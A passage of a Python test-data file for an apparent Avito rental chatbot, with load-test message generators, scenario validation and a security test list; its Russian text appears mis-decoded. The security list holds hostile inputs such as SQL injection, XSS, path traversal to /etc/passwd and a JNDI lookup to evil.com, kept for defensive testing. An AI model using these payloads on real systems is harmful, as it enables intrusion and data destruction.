üë• –ñ–∏–ª—å—Ü—ã: –º—É–∂—á–∏–Ω–∞ 30 –ª–µ—Ç
üî¢ –ö–æ–ª–∏—á–µ—Å—Ç–≤–æ –≤–∑—Ä–æ—Å–ª—ã—Ö: 1
üë∂ –î–µ—Ç–∏: –ù–µ—Ç
üêæ –ñ–∏–≤–æ—Ç–Ω—ã–µ: –ù–µ—Ç
üìÖ –°—Ä–æ–∫ –∞—Ä–µ–Ω–¥—ã: –æ—Ç 12 –º–µ—Å—è—Ü–µ–≤
üóìÔ∏è –î–∞—Ç–∞ –∑–∞–µ–∑–¥–∞: —Å 1 —Å–µ–Ω—Ç—è–±—Ä—è

‚úÖ –°—Ç–∞—Ç—É—Å: –ì–æ—Ç–æ–≤ –∫ –ø—Ä–µ–∑–µ–Ω—Ç–∞—Ü–∏–∏ —Å–æ–±—Å—Ç–≤–µ–Ω–Ω–∏—Ü–µ"""

    @staticmethod
    def get_performance_test_data():
        """–î–∞–Ω–Ω—ã–µ –¥–ª—è —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏—è –ø—Ä–æ–∏–∑–≤–æ–¥–∏—Ç–µ–ª—å–Ω–æ—Å—Ç–∏"""
        base_time = int(time.time())
        
        # –ì–µ–Ω–µ—Ä–∏—Ä—É–µ–º –º–Ω–æ–≥–æ —Å–æ–æ–±—â–µ–Ω–∏–π –¥–ª—è –Ω–∞–≥—Ä—É–∑–æ—á–Ω–æ–≥–æ —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏—è
        messages = []
        for i in range(100):
            messages.extend([
                {
                    "id": i * 2 + 1,
                    "direction": "in",
                    "type": "text",
                    "created": base_time - (100 - i) * 10,
                    "author_id": 12345 + i,
                    "content": {"text": f"–°–æ–æ–±—â–µ–Ω–∏–µ –æ—Ç –∫–ª–∏–µ–Ω—Ç–∞ {i}"}
                },
                {
                    "id": i * 2 + 2,
                    "direction": "out",
                    "type": "text",
                    "created": base_time - (100 - i) * 10 + 5,
                    "author_id": 0,
                    "content": {"text": f"–û—Ç–≤–µ—Ç –∞–≥–µ–Ω—Ç–∞ {i}"}
                }
            ])
        
        return {
            "name": "–ù–∞–≥—Ä—É–∑–æ—á–Ω–æ–µ —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ",
            "messages": messages,
            "expected_processing_time": 1.0  # –°–µ–∫—É–Ω–¥—ã
        }
    
    @staticmethod
    def get_security_test_data():
        """–î–∞–Ω–Ω—ã–µ –¥–ª—è —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏—è –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏"""
        return {
            "malicious_inputs": [
                "'; DROP TABLE users; --",  # SQL injection
                "<script>alert('xss')</script>",  # XSS
                "../../etc/passwd",  # Path traversal
                "${jndi:ldap://evil.com/x}",  # JNDI injection
                "javascript:alert(1)",  # JavaScript injection
                "\x00\x01\x02",  # Null bytes
                "A" * 10000,  # Buffer overflow attempt
                "\n\r\t",  # Control characters
                "ü§ñüíªüî•" * 100,  # Unicode bombing
                "eval('alert(1)')"  # Code injection
            ],
            "valid_phones": [
                "+7 999 123 45 67",
                "8 (999) 123-45-67",
                "79991234567",
                "+7(999)1234567"
            ],
            "invalid_phones": [
                "123",
                "abc",
                "+7 999",
                "javascript:alert(1)",
                "<script>",
                "'; DROP TABLE"
            ]
        }

class ScenarioRunner:
    """–ö–ª–∞—Å—Å –¥–ª—è –∑–∞–ø—É—Å–∫–∞ —Ç–µ—Å—Ç–æ–≤—ã—Ö —Å—Ü–µ–Ω–∞—Ä–∏–µ–≤"""
    
    def __init__(self):
        self.scenarios = TestScenarios()
        self.test_data = TestData()
        
    def get_all_dialog_scenarios(self):
        """–ü–æ–ª—É—á–∏—Ç—å –≤—Å–µ —Å—Ü–µ–Ω–∞—Ä–∏–∏ –¥–∏–∞–ª–æ–≥–æ–≤"""
        return [
            self.scenarios.get_complete_dialog_scenario(),
            self.scenarios.get_family_with_pets_scenario(),
            self.scenarios.get_incomplete_dialog_scenario(),
            self.scenarios.get_difficult_client_scenario(),
            self.scenarios.get_system_message_scenario(),
            self.scenarios.get_followup_scenario()
        ]
    
    def get_edge_cases(self):
        """–ü–æ–ª—É—á–∏—Ç—å –ø–æ–≥—Ä–∞–Ω–∏—á–Ω—ã–µ —Å–ª—É—á–∞–∏"""
        return self.scenarios.get_edge_case_scenarios()
    
    def validate_scenario(self, scenario):
        """–í–∞–ª–∏–¥–∞—Ü–∏—è —Å—Ü–µ–Ω–∞—Ä–∏—è"""
        required_fields = ["name", "description", "messages"]
        
        for field in required_fields:
            if field not in scenario:
                return False, f"–û—Ç—Å—É—Ç—Å—Ç–≤—É–µ—Ç –ø–æ–ª–µ: {field}"
                
        if not isinstance(scenario["messages"], list):
            return False, "messages –¥–æ–ª–∂–µ–Ω –±—ã—Ç—å —Å–ø–∏—Å–∫–æ–º"
            
        for i, message in enumerate(scenario["messages"]):
            required_msg_fields = ["id", "direction", "type", "created", "author_id"]
            for field in required_msg_fields:
                if field not in message:
                    return False, f"–í —Å–æ–æ–±—â–µ–Ω–∏–∏ {i} –æ—Ç—Å—É—Ç—Å—Ç–≤—É–µ—Ç –ø–æ–ª–µ: {field}"
                    
        return True, "–°—Ü–µ–Ω–∞—Ä–∏–π –≤–∞–ª–∏–¥–µ–Ω"
    
    def print_scenario_summary(self, scenario):
        """–í—ã–≤–æ–¥ –∫—Ä–∞—Ç–∫–æ–≥–æ –æ–ø–∏—Å–∞–Ω–∏—è —Å—Ü–µ–Ω–∞—Ä–∏—è"""
        print(f"–°—Ü–µ–Ω–∞—Ä–∏–π: {scenario['name']}")
        print(f"–û–ø–∏—Å–∞–Ω–∏–µ: {scenario['description']}")
        print(f"–°–æ–æ–±—â–µ–Ω–∏–π: {len(scenario['messages'])}")
        
        # –ü–æ–¥—Å—á–µ—Ç —Å–æ–æ–±—â–µ–Ω–∏–π –ø–æ –Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–∏—è–º
        incoming = len([m for m in scenario['messages'] if m['direction'] == 'in'])
        outgoing = len([m for m in scenario['messages'] if m['direction'] == 'out'])
        
        print(f"–í—Ö–æ–¥—è—â–∏—Ö: {incoming}, –ò—Å—Ö–æ–¥—è—â–∏—Ö: {outgoing}")
        
        if 'expected_extraction' in scenario:
            print("–û–∂–∏–¥–∞–µ—Ç—Å—è –∏–∑–≤–ª–µ—á–µ–Ω–∏–µ –¥–∞–Ω–Ω—ã—Ö –∫–ª–∏–µ–Ω—Ç–∞")
            
        if 'should_followup' in scenario:
            print(f"Follow-up –æ–∂–∏–¥–∞–µ—Ç—Å—è: {scenario['should_followup']}")
            
        print("-" * 50)

def main():
    """–î–µ–º–æ–Ω—Å—Ç—Ä–∞—Ü–∏—è —Ç–µ—Å—Ç–æ–≤—ã—Ö —Å—Ü–µ–Ω–∞—Ä–∏–µ–≤"""
    print("–¢–ï–°–¢–û–í–´–ï –°–¶–ï–ù–ê–†–ò–ò AVITO RENTAL BOT")
    print("=" * 50)
    
    runner = ScenarioRunner()
    
    # –ü–æ–ª—É—á–∞–µ–º –≤—Å–µ —Å—Ü–µ–Ω–∞—Ä–∏–∏
    scenarios = runner.get_all_dialog_scenarios()
    edge_cases = runner.get_edge_cases()
    
    print(f"\n–í—Å–µ–≥–æ –¥–∏–∞–ª–æ–≥–æ–≤—ã—Ö —Å—Ü–µ–Ω–∞—Ä–∏–µ–≤: {len(scenarios)}")
    print(f"–ü–æ–≥—Ä–∞–Ω–∏—á–Ω—ã—Ö —Å–ª—É—á–∞–µ–≤: {len(edge_cases)}")
    
    print(f"\n–û–ü–ò–°–ê–ù–ò–ï –°–¶–ï–ù–ê–†–ò–ï–í:")
    print("-" * 30)
    
    # –í—ã–≤–æ–¥–∏–º –æ–ø–∏—Å–∞–Ω–∏–µ –∫–∞–∂–¥–æ–≥–æ —Å—Ü–µ–Ω–∞—Ä–∏—è
    for scenario in scenarios:
        is_valid, message = runner.validate_scenario(scenario)
        if is_valid:
            runner.print_scenario_summary(scenario)
        else:
            print(f"–û–®–ò–ë–ö–ê –≤ —Å—Ü–µ–Ω–∞—Ä–∏–∏ {scenario.get('name', '–ë–µ–∑—ã–º—è–Ω–Ω—ã–π')}: {message}")
    
    # –ü–æ–≥—Ä–∞–Ω–∏—á–Ω—ã–µ —Å–ª—É—á–∞–∏
    print(f"\n–ü–û–ì–†–ê–ù–ò–ß–ù–´–ï –°–õ–£–ß–ê–ò:")
    print("-" * 20)
    for case_name, case_data in edge_cases.items():
        print(f"- {case_data['name']}: {case_data['expected_behavior']}")
    
    # –î–∞–Ω–Ω—ã–µ –¥–ª—è —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏—è –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏
    security_data = runner.test_data.get_security_test_data()
    print(f"\n–¢–ï–°–¢–´ –ë–ï–ó–û–ü–ê–°–ù–û–°–¢–ò:")
    print("-" * 18)
    print(f"–ú–∞–ª–∏—Ü–∏–æ–∑–Ω—ã—Ö –≤—Ö–æ–¥–æ–≤: {len(security_data['malicious_inputs'])}")
    print(f"–í–∞–ª–∏–¥–Ω—ã—Ö —Ç–µ–ª–µ—Ñ–æ–Ω–æ–≤: {len(security_data['valid_phones'])}")
    print(f"–ù–µ–≤–∞–ª–∏–¥–Ω—ã—Ö —Ç–µ–ª–µ—Ñ–æ–Ω–æ–≤: {len(security_data['invalid_phones'])}")
    
    print(f"\n–ò–°–ü–û–õ–¨–ó–û–í–ê–ù–ò–ï:")
    print("–≠—Ç–∏ —Å—Ü–µ–Ω–∞—Ä–∏–∏ –º–æ–∂–Ω–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –≤ test_system.py –¥–ª—è:")
    print("- –¢–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏—è –ª–æ–≥–∏–∫–∏ –æ–±—Ä–∞–±–æ—Ç–∫–∏ –¥–∏–∞–ª–æ–≥–æ–≤")
    print("- –ü—Ä–æ–≤–µ—Ä–∫–∏ –∏–∑–≤–ª–µ—á–µ–Ω–∏—è –¥–∞–Ω–Ω—ã—Ö –∫–ª–∏–µ–Ω—Ç–æ–≤")
    print("- –¢–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏—è follow-up –º–µ—Ö–∞–Ω–∏–∑–º–∞")
    print("- –ü—Ä–æ–≤–µ—Ä–∫–∏ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏ –∏ –æ–±—Ä–∞–±–æ—Ç–∫–∏ –æ—à–∏–±–æ–∫")
    print("- –ù–∞–≥—Ä—É–∑–æ—á–Ω–æ–≥–æ —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏—è")

if __name__ == "__main__":
    main()